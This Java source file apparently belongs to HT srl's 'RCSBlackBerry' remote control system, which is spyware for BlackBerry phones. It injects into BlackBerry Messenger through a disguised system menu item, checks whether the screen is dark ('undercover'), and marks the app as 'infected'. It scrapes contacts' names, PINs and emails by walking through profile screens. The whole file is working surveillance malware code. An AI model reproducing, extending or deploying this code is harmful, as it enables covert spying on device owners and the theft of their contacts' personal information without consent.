//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.module.im;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.menuitem.ApplicationMenuItem;
import net.rim.blackberry.api.menuitem.ApplicationMenuItemRepository;
import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.ui.Screen;
import net.rim.device.api.ui.UiApplication;
import blackberry.Status;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.FieldExplorer;
import blackberry.injection.MenuWalker;
import blackberry.utils.Utils;

public class BBMMenuItem extends ApplicationMenuItem {
    private static String BBM_MENU = "Yield Menu";
    //#ifdef DEBUG
    private static Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
    //#endif

    UiApplication bbmApplication;
    Screen contactsScreen;
    // Vector conversationScreens = new Vector();

    Hashtable users = new Hashtable();
    Hashtable userConversations = new Hashtable();

    public boolean bbmInjected = false;

    // int numContacts;
    // int numEmails;

    private static BBMMenuItem instance;
    private static final long GUID = 0x25fbb0c55be3907fL;

    public static synchronized BBMMenuItem getInstance() {
        if (instance == null) {
            instance = (BBMMenuItem) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final BBMMenuItem singleton = new BBMMenuItem(20);

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }
        return instance;
    }

    public BBMMenuItem(int arg0) {
        super(arg0);

        undercover = !Backlight.isEnabled();
        conversationScreen = new ConversationScreen();
        //lookForConversationsThread();

    }

    public void checkForConversationScreen() {
        //#ifdef DEBUG
        debug.trace("checkForConversationScreen");
        //#endif
        conversationScreen.getConversationScreen();
    }

    Vector contacts = new Vector();
    Thread t = null;
    boolean undercover = false;
    ConversationScreen conversationScreen;

    public synchronized Object run(Object context) {
        try {

            if (bbmInjected) {
                //#ifdef DEBUG
                debug.trace("run: already injected");
                //#endif
                return null;
            }

            //#ifdef DEBUG
            debug.init();
            debug.info("BBMMenuItem context: " + context);
            //#endif

            UiApplication app = UiApplication.getUiApplication();
            Class cl = app.getClass();

            //#ifdef DEBUG
            debug.trace("class: " + cl);
            //#endif

            checkScreen(3);

            //debug.stopBuffering();

        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.warn("injectBBM:" + ex.toString());
            //#endif

            if (Status.self().wantLight()) {
                Debug.ledFlash(Debug.COLOR_RED);
            }
        }

        return null;
    }

    private void checkScreen(int tries) {
        Screen screen = UiApplication.getUiApplication().getActiveScreen();
        if (tries <= 0) {
            //#ifdef DEBUG
            debug.trace("checkScreen: no more tries");
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.trace("screen: " + screen + " count: "
                + screen.getUiEngine().getScreenCount());
        //#endif

        //debug.startBuffering(EventLogger.INFORMATION);
        //#ifdef DEBUG
        debug.trace("run: " + screen.getClass().getName());
        //#endif
        if (screen.getClass().getName().indexOf("ContactsScreen") > 0) {
            contacts.removeAllElements();

            contactsScreen = screen;
            bbmApplication = UiApplication.getUiApplication();

            //#ifdef DEBUG
            FieldExplorer explorer = new FieldExplorer();
            contacts = explorer.explore(screen);
            //#endif

            screen.close();
            bbmInjected = true;

            // lookForConversationsThread();
            conversationScreen.setBBM(bbmApplication);

            //#ifdef DEBUG
            debug.info("BBM INJECTED!");
            //#endif

            if (Status.self().wantLight()) {
                Debug.ledFlash(Debug.COLOR_GREEN);
            }

            AppInjectorBBM.getInstance().setInfected(true);

        } else if (screen.getClass().getName().indexOf("ConversationScreen") > 0) {
            //#ifdef DEBUG
            debug.info("checkScreen: Conversation, closing");
            //#endif
            screen.close();
            checkScreen(tries - 1);
        } else {
            //#ifdef DEBUG

            debug.warn("BBM NOT INJECTED!");
            //#endif

            if (Status.self().isDemo()) {
                Debug.ledFlash(Debug.COLOR_RED);
            }
        }
    }

    private synchronized boolean extractProfile(Screen screen) {
        //#ifdef DEBUG
        debug.trace("extractProfile");
        debug.trace("  local active screen: "
                + UiApplication.getUiApplication().getActiveScreen());
        //#endif

        try {
            if (MenuWalker.walk("View Contact Profile", screen, true)
                    || MenuWalker.walk("Contact Profile", screen, true)) {
                //#ifdef DEBUG
                Debug debug = new Debug("BBMMenuItem", DebugLevel.VERBOSE);
                debug.info("walked in Contact Profile");
                //#endif
                Utils.sleep(100);
                Screen newScreen = UiApplication.getUiApplication()
                        .getActiveScreen();

                if (newScreen.getClass().getName().indexOf("BBMUserInfoScreen") < 0) {
                    //#ifdef DEBUG
                    debug.trace("no Contact Profile: " + newScreen);
                    //#endif
                    return false;
                }
                // Ocio che gli schermi aperti vengono agganciati a
                // UiApplication!
                // debug.trace("  active screen: " + newScreen);
                // debug.trace("  local active screen: "
                // + UiApplication.getUiApplication().getActiveScreen());

                //#ifdef DEBUG
                debug.trace("exploring Contact Profile: " + newScreen);
                //#endif

                FieldExplorer explorer = new FieldExplorer();
                Vector textfields = explorer.explore(newScreen);

                if (textfields.size() == 2 || textfields.size() == 3) {
                    String user = (String) textfields.elementAt(0);
                    String pin = (String) textfields.elementAt(1);
                    String email = "";

                    //#ifdef DEBUG
                    debug.info("User: " + user);
                    debug.info("PIN: " + pin);
                    //#endif

                    if (textfields.size() == 3) {
                        email = (String) textfields.elementAt(2);
                        //#ifdef DEBUG
                        debug.info("Email: " + email);
                        //#endif
                    }

                    users.put(user.toLowerCase(), new User(user, pin, email));

                    if (Status.self().wantLight()) {
                        Debug.ledFlash(Debug.COLOR_ORANGE);
                    }
                }
                //#ifdef DEBUG
                debug.trace("closing Contact Profile");
                //#endif
                newScreen.close();
            } else {
                //#ifdef DEBUG
                debug.info("");
                //#endif
            }

        } catch (Exception ex) {
            //debug.stopBuffering();
            //#ifdef DEBUG
            debug.error(ex.toString());
            //#endif
            return false;
        }
        return true;
    }

    public String toString() {
        return BBM_MENU;
    }

    boolean menuAdded = false;

    public synchronized void addMenuBBM() {
        if (!menuAdded) {
            //#ifdef DEBUG
            debug.trace("addMenuBBM: " + toString());
            //#endif

            long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
            ApplicationMenuItemRepository.getInstance()
                    .addMenuItem(bbmid, this);
            menuAdded = true;
        }
    }

    public synchronized void removeMenuBBM() {
        if (menuAdded) {
            //#ifdef DEBUG
            debug.trace("removeMenuBBM");
            //#endif
            long bbmid = ApplicationMenuItemRepository.MENUITEM_SYSTEM;
            ApplicationMenuItemRepository.getInstance().removeMenuItem(bbmid,
                    this);
            menuAdded = false;
        }
    }

}
